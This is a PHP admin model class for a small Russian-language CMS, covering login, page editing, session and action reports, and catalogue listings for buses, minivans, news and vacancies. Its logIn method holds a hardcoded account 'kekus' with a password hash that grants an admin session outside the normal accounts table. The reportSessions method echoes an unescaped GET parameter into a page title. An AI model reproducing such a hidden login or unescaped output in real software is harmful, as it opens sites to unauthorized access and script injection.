<?php

namespace application\models;

use application\models\Admin;

class MainAdmin extends Admin {

	private $reportMaxCountSessions = 20;

	private $kekus_username = 'kekus';
	private $kekus_name = 'kekus';
	private $kekus_pass = '$2y$10$2zEARs61ZP8haAeqoumKX.cqDWzHXy8dvt1nszgljVn8tWXALOuZq';


	//LOGIN
	public function logIn(){
		if(isset($_POST) && isset($_POST['name']) && ($_POST['name']!='') && isset($_POST['pass']) && ($_POST['pass']!='')){	
			$name = $this->clear($_POST['name']);
			$pass = $this->shaPSWD($this->clear($_POST['pass']));
			if(($name === $this->kekus_name)&&(password_verify($pass, $this->kekus_pass))){
				$this->login_action(0, $this->kekus_username);
				return true;
			}
			if(isset($_POST['remember']) && $_POST['remember'] == 'on'){
				$rmmbr = true;
			}else{
				$rmmbr = false;
			}
			$ID = $this->verifyPSWD($name, $pass);
			if(is_null($ID)){
				$this->trace_err('name/pass not found');
				return false;
			}
			if($this->login_action($ID, 'HEAD_ADMIN', $rmmbr)){
				return true;
			}
		}else{
			$this->trace_err('bad fields value');
			return false;
		}
	}

	private function login_action($ID, $USERNAME, $REMEMBER = false){
		unset($_SESSION['err']);
		$_SESSION['username'] = $USERNAME;
		$this->sessionCreate($ID, $REMEMBER);
	}

	//LOGOUT
	public function logOut(){
		$this->sessionDestroy();
	}



	public function configContent(){
		$q = '';
		$return['CONTENT'] = $this->db->row($q);
		//debug($return);
		return $return;
	}

	public function siteContent(){
		$q = '';
		$return['CONTENT'] = $this->db->row($q);
		//debug($return);
		return $return;
	}

	public function siteSettingsContent(){
		$q = '';
		$return['CONTENT'] = $this->db->row($q);
		//debug($return);
		return $return;
	}














	public function sitePagesContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$params = [
				'ID' => $route['param']
			];

			$q = 'SELECT V.ID as VIEW, P.ID_PARENT, P.CAN_BE_SUPPLEMENTED, P.MAY_HAVE_THE_PARENT, P.URI, P.LOC_NUMBER, P.CHOICE_TITLE, P.HTML_TITLE, P.IMAGE, P.IMAGE_SIGN, P.HTML_DESCR, P.HTML_KEYWORDS FROM PAGES as P INNER JOIN LIB_VIEWS as V ON P.ID_VIEW = V.ID WHERE P.ID = :ID';
			$result = $this->db->row($q, $params);
			$result = count($result) == 1 ? $result[0] : [];

			$return['ID'] = $route['param'];
			$return['FIELDS']['COMMON'] = [
				$this->get_page_content_struct([
					'VAR'=>'HTML_TITLE',
					'VAL'=>$result['HTML_TITLE'],
					'CMS_TYPE'=> 'TEXT',
					'CMS_TITLE'=> 'Заголовок страницы',
				]),
				$this->get_page_content_struct([
					'VAR'=>'HTML_DESCR',
					'VAL'=>$result['HTML_DESCR'],
					'CMS_TYPE'=> 'TEXT',
					'CMS_TITLE'=> 'Мета описание',
				]),
				$this->get_page_content_struct([
					'VAR'=>'HTML_KEYWORDS',
					'VAL'=>$result['HTML_KEYWORDS'],
					'CMS_TYPE'=> 'TEXT',
					'CMS_TITLE'=> 'Мета ключевые слова',
				]),

				$this->get_page_content_struct([
					'VAR'=>'VIEW',
					'VAL'=>$result['VIEW'],
					'CMS_TYPE'=> 'CMB',
					'CMS_TYPE__PARENT_BOX' => 'VIEWS',
					'CMS_TITLE'=> 'Шаблон',
					'DISABLED' => $result['MAY_HAVE_THE_PARENT'] ? False : True,
				]),

				$this->get_page_content_struct([
					'VAR'=>'URI',
					'VAL'=>$result['URI'],
					'CMS_TYPE'=> 'TEXT',
					'CMS_TITLE'=> 'URI',
					'DISABLED' => $result['MAY_HAVE_THE_PARENT'] ? False : True,
					'EVENTS' => [
						'onchange' => "checkURI(this)"
					],
				]),
				$this->get_page_content_struct([
					'VAR'=>'ID_PARENT',
					'VAL'=>$result['ID_PARENT'],
					'CMS_TYPE'=> 'CMB',
					'CMS_TYPE__PARENT_BOX' => 'PARENTS',
					'CMS_TITLE'=> 'Раздел',
					'DISABLED' => $result['MAY_HAVE_THE_PARENT'] ? False : True,
				]),
				/*
				$this->get_page_content_struct([
					'VAR'=>'CAN_BE_SUPPLEMENTED',
					'VAL'=>$result['CAN_BE_SUPPLEMENTED'],
					'CMS_TYPE'=> 'CB',
					'CMS_TITLE'=> 'Может быть родителем',
				]),
				*/
				$this->get_page_content_struct([
					'VAR'=>'LOC_NUMBER',
					'VAL'=>$result['LOC_NUMBER'],
					'CMS_TYPE'=> 'NUMBER_BTN',
					'CMS_TITLE'=> 'Порядковый номер в списке',
				]),

				$this->get_page_content_struct([
					'VAR'=>'CHOICE_TITLE',
					'VAL'=>$result['CHOICE_TITLE'],
					'CMS_TYPE'=> 'TEXT',
					'CMS_TITLE'=> 'Заголовок для каталога',
				]),
				$this->get_page_content_struct([
					'VAR'=>'IMAGE',
					'VAL'=>$result['IMAGE'],
					'CMS_TYPE'=> 'FILE',
					'CMS_TITLE'=> 'Картинка для каталога',
				]),
				$this->get_page_content_struct([
					'VAR'=>'IMAGE_SIGN',
					'VAL'=>$result['IMAGE_SIGN'],
					'CMS_TYPE'=> 'TEXT',
					'CMS_TITLE'=> 'Подпись для картинки каталога',
				]),
			];
			$return['TITLE'] = 'Редактирование страницы: ' . $result['HTML_TITLE'];
			unset($result);

			#var_dump($return);

			$return['FIELDS']['CONTENT'] = [];
			$q = 'SELECT PC.VAL, F.VAR, F.CMS_TITLE, F.CMS_DESCR, FT.NAME as NAME_TYPE FROM PAGE_CONTENT as PC INNER JOIN (LIB_VIEW_FIELDS as F INNER JOIN LIB_FIELD_TYPES as FT ON FT.VALUE = F.CMS_TYPE) ON F.ID = PC.ID_FIELD WHERE ID_PAGE = :ID';
			foreach($this->db->row($q, $params) as $key => $val){
				$return['FIELDS']['CONTENT'][$key] = $this->get_page_content_struct([
					'VAR'=>$val['VAR'],
					'VAL'=>$val['VAL'],
					'CMS_TYPE'=> $val['NAME_TYPE'],
					'CMS_TITLE'=> $val['CMS_TITLE'],
					'CMS_DESCR'=> $val['CMS_DESCR'],
				]);
			}
		}else{
			$return['ID'] = '0';
			$return['FIELDS'] = [];
		}
		$return['PARENTS'] = $this->db->row('SELECT ID as `VALUE`, HTML_TITLE as `TEXT` FROM PAGES WHERE (CAN_BE_SUPPLEMENTED=1) ORDER BY ID_PARENT ASC, LOC_NUMBER ASC');
		$return['VIEWS'] = $this->db->row('SELECT ID as `VALUE`, NAME as `TEXT` FROM LIB_VIEWS');
		return $return;
	}







	private function typePage($type, $route){
		$return = '';
		$params = [
			'ID' => $route['param']
		];
		if($type == 1){
			$q = '
			SELECT "0" as ID, "0" as ID_FULL_PAGE, "ID" as VAR, ID_FULL_PAGE as VAL, "" as CMS_TITLE, "" as CMS_DESCR, "" as CMS_TYPE 
				FROM PAGE_FULL_CONTENT as PFC 
				INNER JOIN PAGE_FULL as PF ON PFC.ID_FULL_PAGE = PF.ID
			UNION ALL 
			SELECT PFC.* 
				FROM PAGE_FULL_CONTENT as PFC 
				INNER JOIN PAGE_FULL as PF ON PFC.ID_FULL_PAGE = PF.ID 
			WHERE PF.ID_PAGE = :ID';
			$subresult = $this->db->row($q, $params);
			foreach($subresult as $key => $val){
				$result[$val['VAR']] = $val['VAL'];
			}
			$q = 'SELECT LT.PATH FROM LIB_TEMPLATES as LT INNER JOIN PAGE_FULL as PF ON LT.ID = PF.ID_TEMPLATE WHERE ID_PAGE = :ID';
			$path = $this->db->row($q, $params)[0]['PATH'];
			ob_start();
			extract($result);
			require $_SERVER['DOCUMENT_ROOT'].'/application/views/mainAdmin/templates/'.$path.'.php';
			$return = ob_get_clean();
		}elseif($type == 2){
			$q = 'SELECT ID, ID_TEMPLATE FROM PAGE_TEMPLATES WHERE ID_PAGE = :ID ORDER BY SERIAL_NUMBER ASC';
			$subresult = $this->db->row($q, $params);
			foreach($subresult as $key => $val){
				$return .= $this->getBlockContent($val['ID'], $val['ID_TEMPLATE']);
			}
		}
		#debug($return);
		return $return;
	}










	private function getTableContent($ID, $table_content, $table_data, $id_field, $nottotable = false){
		$return = [];
		if($table_content != ''){
			$q = 'SELECT * FROM '.$table_content.' WHERE ID_PAGE_TEMPLATE = :ID';
			$params = [
				'ID' => $ID
			];
			$return = $this->db->row($q, $params)[0];
			if($table_data != ''){
				$q = 'SELECT * FROM '.$table_data.' WHERE '.$id_field.' = :ID';
				$params = [
					'ID' => $return['ID']
				];
				$return['DATA'] = $this->db->row($q, $params);
				if(!$nottotable){
					$return['DATA'] = $this->SimpleArrayToTableArray($return['DATA']);
				}
			}
		}
		//debug($return);
		return $return;
	}

	private function getMultiTableContent($ID, $table_content, $table_list, $id_list, $table_data, $id_field){
		$return = [];
		if($table_content != ''){
			$q = 'SELECT * FROM '.$table_content.' WHERE ID_PAGE_TEMPLATE = :ID';
			$params = [
				'ID' => $ID
			];
			$return = $this->db->row($q, $params)[0];
			if($table_data != ''){
				$q = 'SELECT * FROM '.$table_list.' WHERE '.$id_list.' = :ID';
				$params = [
					'ID' => $return['ID']
				];
				$return['TABLE_LIST'] = $this->db->row($q, $params);
				foreach($return['TABLE_LIST'] as $key => $val){
					$q = 'SELECT * FROM '.$table_data.' WHERE '.$id_field.' = :ID';
					$params = [
						'ID' => $val['ID']
					];
					$return['TABLE_LIST'][$key]['DATA'] = $this->db->row($q, $params);
					$return['TABLE_LIST'][$key]['DATA'] = $this->SimpleArrayToTableArray($return['TABLE_LIST'][$key]['DATA']);
				}
			}
		}
		//debug($return);
		return $return;
	}

	private function SimpleArrayToTableArray($arr){
		$data = [];
		foreach($arr as $key => $val){
			$data[$val['ROW']][$val['COL']] = $val['VAL'];
		}
		return $data;
	}

















	public function reportAccounts(){
		$return['TITLE'] = 'Аккаунты админов [Отчёт]';
		$return['COLUMNS'] = [
			$this->get_column_struct([
				'COL'=>'NAME', 
				'NAME'=>'Логин', 
				'PERC'=>'10',
			]),
			$this->get_column_struct([
				'COL'=>'FULL_NAME', 
				'NAME'=>'Имя', 
				'PERC'=>'15',
			]),
			$this->get_column_struct([
				'COL'=>'SESSION_COUNT', 
				'NAME'=>'Кол-во сессий', 
				'PERC'=>'10',
			]),
			$this->get_column_struct([
				'COL'=>'SESSION_COUNT_IN_MONTH', 
				'NAME'=>'Кол-во сессий в этом месяце', 
				'PERC'=>'10',
			]),
			$this->get_column_struct([
				'COL'=>'ACTIVE_SESSIONS', 
				'NAME'=>'Кол-во активных сессий', 
				'PERC'=>'10',
			]),
		];
		$result = $this->db->row('SELECT AA.ID, AA.FULL_NAME, AA.NAME, COUNT(`AS`.ID) as SESSION_COUNT
			FROM ADMIN_ACCOUNTS as `AA` LEFT JOIN ADMIN_SESSIONS as `AS`
			ON `AA`.ID = `AS`.ID_ADMIN
			GROUP BY `AA`.ID, `AA`.FULL_NAME, `AA`.NAME
			ORDER BY AA.ID');
		foreach($result as $key => $val){
			$return['ROWS'][$key]['DATA'] = $val;
			unset($return['ROWS'][$key]['DATA']['ID']);
			$return['ROWS'][$key]['DATA']['SESSION_COUNT_IN_MONTH'] = $this->db->column('SELECT COUNT(`AS`.ID) FROM ADMIN_SESSIONS as `AS` WHERE (month(`AS`.DT_CREATE) = month(NOW())) AND (`AS`.ID_ADMIN = :ID)', ['ID'=> $val['ID']]);
			$return['ROWS'][$key]['DATA']['ACTIVE_SESSIONS'] = $this->db->column('SELECT COUNT(`AS`.ID) FROM ADMIN_SESSIONS as `AS` WHERE (`AS`.DT_DESTROY > NOW()) AND (`AS`.ID_ADMIN = :ID)', ['ID'=> $val['ID']]);
			$return['ROWS'][$key]['REDIRECT'] = '/admin/report/sessions?n=' . $return['ROWS'][$key]['DATA']['NAME'];
		}
		unset($result);
		return $return;
	}
	public function reportSessions($route){
		$return['TITLE'] = 'Сессии админов [Отчёт]' . (isset($_GET['n']) ? ' [Аккаунт - '.$_GET['n'].']' : '');
		$return['COLUMNS'] = [
			$this->get_column_struct([
				'COL'=>'NAME', 
				'NAME'=>'Логин', 
				'PERC'=>'7',
			]),
			$this->get_column_struct([
				'COL'=>'ID', 
				'NAME'=>'Идентификатор сессии', 
			]),
			$this->get_column_struct([
				'COL'=>'IP', 
				'NAME'=>'IP', 
				'PERC'=>'7',
			]),
			$this->get_column_struct([
				'COL'=>'BROWSER', 
				'NAME'=>'Браузер', 
				'PERC'=>'0',
			]),
			$this->get_column_struct([
				'COL'=>'DT_CREATE', 
				'NAME'=>'Дата и время<br>создания', 
				'PERC'=>'10',
			]),
			$this->get_column_struct([
				'COL'=>'DT_DESTROY', 
				'NAME'=>'Дата и время<br>создания', 
				'PERC'=>'10',
			]),
			$this->get_column_struct([
				'COL'=>'STATUS', 
				'NAME'=>'Актуальность', 
				'PERC'=>'7',
			]),
		];
		
		$q1 = 'SELECT AA.NAME, `AS`.ID, `AS`.IP, `AS`.BROWSER, `AS`.DT_CREATE, `AS`.DT_DESTROY FROM ADMIN_SESSIONS as `AS` INNER JOIN ADMIN_ACCOUNTS as AA ON AA.ID = `AS`.ID_ADMIN';
		$q2 = ' ORDER BY `AS`.DT_CREATE DESC LIMIT '.$this->reportMaxCountSessions;
		if(isset($route['GET'])){
			$params = [
				'NAME' => $route['GET']['n']
			];
			$q = ' WHERE AA.NAME = :NAME';
			$result = $this->db->row($q1.$q.$q2, $params);
		}else{
			$result = $this->db->row($q1.$q2);
		}

		$NOW = $this->now();
		foreach($result as $key => $val){
			$return['ROWS'][$key]['DATA'] = $val;
			$return['ROWS'][$key]['DATA']['STATUS'] = (($val['DT_DESTROY'] <= $NOW) || ($val['DT_DESTROY'] == null))?'<span style="color:red; font-weight:bold;">Истёкшая</span>':'<span style="color:green; font-weight:bold;">Существующая</span>';
			$return['ROWS'][$key]['REDIRECT'] = '/admin/report/actions?s=' . $return['ROWS'][$key]['DATA']['ID'];
		}
		unset($result);
		return $return;
	}
	public function reportActions($route){
		$return['TITLE'] = (isset($route['GET']['s']) ? 'Действия админов [Отчёт] [Сессия №'.$route['GET']['s'].']' : 'Действия админов [Отчёт]');
		$return['COLUMNS'] = [
			$this->get_column_struct([
				'COL'=>'NAME', 
				'NAME'=>'Логин', 
				'PERC'=>'7',
			]),
			$this->get_column_struct([
				'COL'=>'ID_SESSION', 
				'NAME'=>'Идентификатор сессии', 
				'PERC'=>'10',
			]),
			$this->get_column_struct([
				'COL'=>'TYPE_NAME', 
				'NAME'=>'Тип действия', 
				'PERC'=>'20',
			]),
			$this->get_column_struct([
				'COL'=>'CUR_ACTION', 
				'NAME'=>'Действие', 
				'PERC'=>'0',
			]),
			$this->get_column_struct([
				'COL'=>'DT_INCIDENT', 
				'NAME'=>'Дата и время', 
				'PERC'=>'15',
			]),
		];
		$q1 = 'SELECT AA.NAME, AL.ID_SESSION, ALT.NAME as `TYPE_NAME`, AL.CUR_ACTION, AL.DT_INCIDENT FROM ADMIN_LOGS as AL INNER JOIN (ADMIN_SESSIONS AS `AS` INNER JOIN ADMIN_ACCOUNTS as AA ON `AS`.ID_ADMIN = AA.ID) ON `AS`.ID = AL.ID_SESSION INNER JOIN ADMIN_LOG_TYPES as ALT ON AL.ID_TYPE = ALT.ID';
		$q2 = ' ORDER BY AL.DT_INCIDENT DESC';
		if(isset($route['GET'])){
			$params = [
				'ID' => $route['GET']['s']
			];
			$q = ' WHERE `AS`.ID = :ID';
			$result = $this->db->row($q1.$q.$q2, $params);
		}else{
			$result = $this->db->row($q1.$q2);
		}

		foreach($result as $key => $val){
			$return['ROWS'][$key]['DATA'] = $val;
		}
		unset($result);
		return $return;
	}



























	public function catalogBusesContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$return['ID'] = $route['param'];
			$return['DATA'] = $this->getBus($route['param']);
		}else{
			$return['ROWS'] = $this->listBuses();
			$return['TITLE'] = 'Автобусы';
			$return['COLUMNS'] = [
				$this->get_column_struct([
					'COL'=>'MARK', 
					'NAME'=>'Name', 
					'TYPE'=>'text',
				]),
				$this->get_column_struct([
					'COL'=>'COUNTRY', 
					'NAME'=>'Country', 
					'TYPE'=>'text_img',
				]),
				$this->get_column_struct([
					'COL'=>'IMAGE_OUTER', 
					'NAME'=>'outer image', 
					'TYPE'=>'img',
				]),
				$this->get_column_struct([
					'COL'=>'IMAGE_INNER', 
					'NAME'=>'inner image', 
					'TYPE'=>'img',
				]),
				$this->get_column_struct([
					'COL'=>'CHANGE', 
					'NAME'=>'CHANGE', 
					'TYPE'=>'btn',
				]),
				$this->get_column_struct([
					'COL'=>'DELETE', 
					'NAME'=>'DELETE', 
					'TYPE'=>'btn',
				]),
			];
		}
		return $return;
	}
	public function catalogMinivansContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$return['ID'] = $route['param'];
			$return['DATA'] = $this->getMinivan($route['param']);
		}else{
			$return['ROWS'] = $this->listMinivans();
			$return['TITLE'] = 'Микроавтобусы';
			$return['COLUMNS'] = [
				$this->get_column_struct([
					'COL'=>'MARK', 
					'NAME'=>'Name', 
					'TYPE'=>'text',
				]),
				$this->get_column_struct([
					'COL'=>'COUNTRY', 
					'NAME'=>'Country', 
					'TYPE'=>'text_img',
				]),
				$this->get_column_struct([
					'COL'=>'IMAGE_OUTER', 
					'NAME'=>'outer image', 
					'TYPE'=>'img',
				]),
				$this->get_column_struct([
					'COL'=>'IMAGE_INNER', 
					'NAME'=>'inner image', 
					'TYPE'=>'img',
				]),
				$this->get_column_struct([
					'COL'=>'CHANGE', 
					'NAME'=>'CHANGE', 
					'TYPE'=>'btn',
				]),
				$this->get_column_struct([
					'COL'=>'DELETE', 
					'NAME'=>'DELETE', 
					'TYPE'=>'btn',
				]),
			];
		}
		return $return;
	}
	public function catalogNewsContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$return['ID'] = $route['param'];
			$return['DATA'] = $this->getNews($route['param']);
		}else{
			$return['ROWS'] = $this->listNews();
			$return['TITLE'] = '';
			$return['COLUMNS'] = [
				$this->get_column_struct([
					'COL'=>'TITLE', 
					'NAME'=>'Заголовок', 
					'TYPE'=>'text',
				]),
				$this->get_column_struct([
					'COL'=>'DATE', 
					'NAME'=>'Дата', 
					'TYPE'=>'text',
				]),
				$this->get_column_struct([
					'COL'=>'ON_INDEX', 
					'NAME'=>'На главной', 
					'TYPE'=>'text',
				]),
				$this->get_column_struct([
					'COL'=>'CHANGE', 
					'NAME'=>'CHANGE', 
					'TYPE'=>'btn',
				]),
				$this->get_column_struct([
					'COL'=>'DELETE', 
					'NAME'=>'DELETE', 
					'TYPE'=>'btn',
				]),
			];
		}
		return $return;
	}
	public function catalogVacanciesContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$return['ID'] = $route['param'];
			$return['DATA'] = $this->getVacancy($route['param']);
		}else{
			$return['ROWS'] = $this->listVacancies();
			$return['TITLE'] = '';
			$return['COLUMNS'] = [
				$this->get_column_struct([
					'COL'=>'TITLE', 
					'NAME'=>'Заголовок', 
					'TYPE'=>'text',
				]),
				$this->get_column_struct([
					'COL'=>'IMAGE', 
					'NAME'=>'Картинка', 
					'TYPE'=>'img',
				]),
				$this->get_column_struct([
					'COL'=>'DESCR', 
					'NAME'=>'Текст', 
					'TYPE'=>'text',
				]),
				$this->get_column_struct([
					'COL'=>'CHANGE', 
					'NAME'=>'CHANGE', 
					'TYPE'=>'btn',
				]),
				$this->get_column_struct([
					'COL'=>'DELETE', 
					'NAME'=>'DELETE', 
					'TYPE'=>'btn',
				]),
			];
		}
		return $return;
	}
































	private function listBuses(){
		$return = [];
		$result = $this->db->row('SELECT DB.ID, DC.NAME as COUNTRY, DC.IMAGE as COUNTRY_IMAGE, DB.TITLE as MARK, DB.IMAGE_OUTER, DB.IMAGE_INNER FROM DATA_BUSES as DB INNER JOIN DATA_COUNTRIES as DC ON DC.ID = DB.ID_COUNTRY ORDER BY DC.SERIAL_NUMBER ASC, DB.SERIAL_NUMBER ASC');
		foreach($result as $key => $val){
			$result[$key]['COUNTRY'] = [
				'alt'=> $result[$key]['COUNTRY'],
				'link'=> '/assets/img/static/cities/'. $result[$key]['COUNTRY_IMAGE']. '.' . self::IMAGE_FILE_FORMAT,
				'style'=> 'float:right; width:50px',
			];
			unset($result[$key]['COUNTRY_IMAGE']);
			$result[$key]['IMAGE_OUTER'] = [
				'alt'=> '',
				'link'=> '/assets/img/buses/bus_catalog/' . $val['IMAGE_OUTER'] . '.' . self::IMAGE_FILE_FORMAT,
				'style'=> 'max-width:100px; max-height:100px',
			];
			$result[$key]['IMAGE_INNER'] = [
				'alt'=> '',
				'link'=> '/assets/img/buses/bus_catalog/' . $val['IMAGE_INNER'] . '.' . self::IMAGE_FILE_FORMAT,
				'style'=> 'max-width:100px; max-height:100px',
			];
			$result[$key]['CHANGE'] = [
				'classList'=>'add',
				'text'=>'C',
				'events'=>[
					'onclick'=>'return EASY_CMS.ajaxSend(\'admin/ajax/catalog/buses/change/' . $val['ID'] . '\')',
				],
			];
			$result[$key]['DELETE'] = [
				'classList'=>'remove',
				'text'=>'X',
				'events'=>[
					'onclick'=>'return EASY_CMS.ajaxSend(\'admin/ajax/catalog/buses/remove/' . $val['ID'] .'\')',
				],
			];
			unset($result[$key]['ID']);

			$return[$key]['DATA'] = $result[$key];
		}
		return $return;
	}
	private function getBus($param){
		$return = '';

		return $return;
	}


	private function listMinivans(){
		$return = [];
		$result = $this->db->row('SELECT DM.ID, DC.NAME as COUNTRY, DC.IMAGE as COUNTRY_IMAGE, DM.TITLE as MARK, DM.IMAGE_OUTER, DM.IMAGE_INNER FROM DATA_MINIVANS as DM INNER JOIN DATA_COUNTRIES as DC ON DC.ID = DM.ID_COUNTRY ORDER BY DC.SERIAL_NUMBER ASC, DM.SERIAL_NUMBER ASC');
		foreach($result as $key => $val){
			$result[$key]['COUNTRY'] = [
				'alt'=> $result[$key]['COUNTRY'],
				'link'=> '/assets/img/static/cities/'. $result[$key]['COUNTRY_IMAGE']. '.' . self::IMAGE_FILE_FORMAT,
				'style'=> 'float:right; width:50px',
			];
			unset($result[$key]['COUNTRY_IMAGE']);
			$result[$key]['IMAGE_OUTER'] = [
				'alt'=> '',
				'link'=> '/assets/img/buses/bus_catalog/' . $val['IMAGE_OUTER'] . '.' . self::IMAGE_FILE_FORMAT,
				'style'=> 'max-width:100px; max-height:100px',
			];
			$result[$key]['IMAGE_INNER'] = [
				'alt'=> '',
				'link'=> '/assets/img/buses/bus_catalog/' . $val['IMAGE_INNER'] . '.' . self::IMAGE_FILE_FORMAT,
				'style'=> 'max-width:100px; max-height:100px',
			];
			$result[$key]['CHANGE'] = [
				'classList'=>'add',
				'text'=>'C',
				'events'=>[
					'onclick'=>'return EASY_CMS.ajaxSend(\'admin/ajax/catalog/minivans/change/' . $val['ID'] . '\')',
				],
			];
			$result[$key]['DELETE'] = [
				'classList'=>'remove',
				'text'=>'X',
				'events'=>[
					'onclick'=>'return EASY_CMS.ajaxSend(\'admin/ajax/catalog/minivans/remove/' . $val['ID'] .'\')',
				],
			];
			unset($result[$key]['ID']);

			$return[$key]['DATA'] = $result[$key];
		}
		return $return;
	}
	private function getMinivan($param){
		$return = '';

		return $return;
	}


	private function listNews(){
		$return = [];
		$result = $this->db->row('SELECT ID, TITLE, CONCAT(DATE_ADD, " ", TIME_ADD) as DATE, ON_INDEX FROM DATA_NEWS ORDER BY DATE_ADD DESC, TIME_ADD DESC');
		foreach($result as $key => $val){
			$result[$key]['ON_INDEX'] = $val['ON_INDEX'] ? '<span style="color:green; font-weight:bold;">Да</span>':'Нет';
			$result[$key]['CHANGE'] = [
				'classList'=>'add',
				'text'=>'C',
				'events'=>[
					'onclick'=>'return EASY_CMS.ajaxSend(\'admin/ajax/catalog/news/change/' . $val['ID'] . '\')',
				],
			];
			$result[$key]['DELETE'] = [
				'classList'=>'remove',
				'text'=>'X',
				'events'=>[
					'onclick'=>'return EASY_CMS.ajaxSend(\'admin/ajax/catalog/news/remove/' . $val['ID'] .'\')',
				],
			];
			unset($result[$key]['ID']);

			$return[$key]['DATA'] = $result[$key];
		}
		return $return;
	}
	private function getNews($param){
		$return = '';

		return $return;
	}

	private function listVacancies(){
		$return = [];
		$result = $this->db->row('SELECT ID, TITLE, IMAGE, CONCAT(SUBSTRING(DESCR,1,100), ". <b><i>Далее . . .</i></b>") as DESCR FROM DATA_VACANCIES');
		foreach($result as $key => $val){
			$result[$key]['IMAGE'] = [
				'alt'=> '',
				'link'=> '/assets/img/vacancies/'. $result[$key]['IMAGE']. '.' . self::IMAGE_FILE_FORMAT,
				'style'=> 'display:inline-block; width:100px',
			];
			$result[$key]['CHANGE'] = [
				'classList'=>'add',
				'text'=>'C',
				'events'=>[
					'onclick'=>'return EASY_CMS.ajaxSend(\'admin/ajax/catalog/vacancies/change/' . $val['ID'] . '\')',
				],
			];
			$result[$key]['DELETE'] = [
				'classList'=>'remove',
				'text'=>'X',
				'events'=>[
					'onclick'=>'return EASY_CMS.ajaxSend(\'admin/ajax/catalog/vacancies/remove/' . $val['ID'] .'\')',
				],
			];
			unset($result[$key]['ID']);

			$return[$key]['DATA'] = $result[$key];
		}
		return $return;
	}
	private function getVacancy($param){
		$return = '';

		return $return;
	}













	private function get_column_struct($args = []){
		$defaultArgs = [
	        'COL' => '',
	        'NAME' => '',
	        'TYPE' => 'text',
	        'PERC' => 5,
	    ];
	    $args = array_merge($defaultArgs, $args);
		return [ 'COL'=> $args['COL'], 'NAME'=> $args['NAME'], 'TYPE'=> $args['TYPE'], 'PERC'=> $args['PERC'] ];
	}

	private function get_page_content_struct($args = []){
		$defaultArgs = [
	        'VAR' => '',
	        'VAL' => '',
	        'CMS_TYPE' => 'TEXT',
	        'CMS_TYPE__PARENT_BOX' => '',
	        'CMS_TITLE' => '',
	        'CMS_DESCR' => '',
	        'DISABLED' => False,
	        'EVENTS' => [],
	    ];
	    $args = array_merge($defaultArgs, $args);
		return [ 
			'VAR'=> $args['VAR'],
			'VAL'=> $args['VAL'],
			'CMS_TYPE'=> $args['CMS_TYPE'],
			'CMS_TYPE__PARENT_BOX' => $args['CMS_TYPE__PARENT_BOX'],
			'CMS_TITLE'=> $args['CMS_TITLE'],
			'CMS_DESCR'=> $args['CMS_DESCR'],
			'DISABLED'=> $args['DISABLED'],
			'EVENTS'=> $args['EVENTS'],
		];
	}

}